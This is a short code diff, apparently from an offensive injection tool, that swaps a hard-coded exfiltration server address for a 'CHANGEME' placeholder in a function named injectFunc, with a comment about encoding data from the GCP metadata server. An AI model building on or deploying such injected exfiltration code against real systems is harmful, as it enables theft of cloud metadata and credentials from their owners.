@@ -29,8 +29,9 @@ function onFrameLoad() {
 }
 
 function injectFunc() {
+    // Settings
     let debug = false
-    let exfilServer = "http://stpaul.intrud.es:8081/"
+    let exfilServer = "http://CHANGEME:8080/"
 
     // This solves encoding issues found with the GCP metadata server
     function b64encode(text) {
